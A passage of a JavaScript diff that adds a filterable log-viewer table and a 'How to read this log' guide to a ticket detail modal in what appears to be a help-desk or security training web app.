+      + r.map((v, j) => `<td style="padding:5px 10px;color:${s.type === 'kv' && j === 0 ? '#88aa99' : '#c0e8c8'};vertical-align:top;${j === 0 || s.type !== 'kv' ? 'white-space:nowrap;' : ''}">${tkLogEsc(v)}</td>`).join('')
+      + '</tr>').join('');
+    body = `<div style="display:flex;gap:10px;align-items:center;margin-bottom:8px;flex-wrap:wrap;">
+        <input type="text" placeholder="Filter rows (user, host, IP, event ID...)" oninput="tkFilterLog(this.value)"
+          style="flex:1;min-width:200px;padding:7px 10px;background:#030d05;border:1px solid #1a4a2a;color:#c0e8c8;border-radius:6px;font-size:.85rem;">
+        <span id="tk-log-count" style="font-size:.78rem;color:#88aa99;">${s.rows.length} rows</span>
+      </div>
+      <div style="overflow:auto;max-height:440px;border:1px solid #143a20;border-radius:6px;background:#030d05;">
+        <table style="width:100%;border-collapse:collapse;${mono}"><thead><tr>${th}</tr></thead><tbody>${rows}</tbody></table>
+      </div>`;
+  }
+  panel.innerHTML = `<details open style="margin-bottom:10px;"><summary style="cursor:pointer;font-size:.8rem;font-weight:700;color:#ffd700;">How to read this log</summary>
+      <div style="font-size:.84rem;color:#c0e8c8;line-height:1.55;margin-top:6px;">${tkLogEsc(s.guide)}</div></details>` + body;
+}
+function tkFilterLog(q) {
+  q = q.trim().toLowerCase();
+  let shown = 0;
+  const rows = document.querySelectorAll('#tk-log-panel .tk-log-row');
+  rows.forEach(tr => { const hit = !q || tr.textContent.toLowerCase().includes(q); tr.style.display = hit ? '' : 'none'; if (hit) shown++; });
+  const c = document.getElementById('tk-log-count');
+  if (c) c.textContent = q ? shown + ' of ' + rows.length + ' rows' : rows.length + ' rows';
+}
+
 function tkStatusStyle(st) {
   const m = {
     'New':         'background:#1a1a2e;color:#aaa;border:1px solid #333;',
@@ -10789,6 +14950,8 @@ function openTicketDetail(ticketId) {
       <div style="font-size:.78rem;font-weight:700;color:#88aa99;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;">Description</div>
       <div style="font-size:.9rem;color:#d0e8d8;line-height:1.7;background:#071a0a;border:1px solid #1a4a2a;border-radius:8px;padding:14px;margin-bottom:20px;white-space:pre-line;">${t.desc}</div>
 
+      ${tkLogsHtml(t.id)}
+
       <!-- Status + Priority controls -->
       <div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:20px;">
         <div style="flex:1;min-width:140px;">
@@ -10824,6 +14987,7 @@ function openTicketDetail(ticketId) {
 
   document.getElementById('ticket-detail-inner').innerHTML = inner;
   document.getElementById('ticket-detail-modal').style.display = 'block';
+  if ((TICKET_LOGS[t.id] || []).length) tkShowLog(t.id, 0);
 }
 
 function closeTicketDetail() {
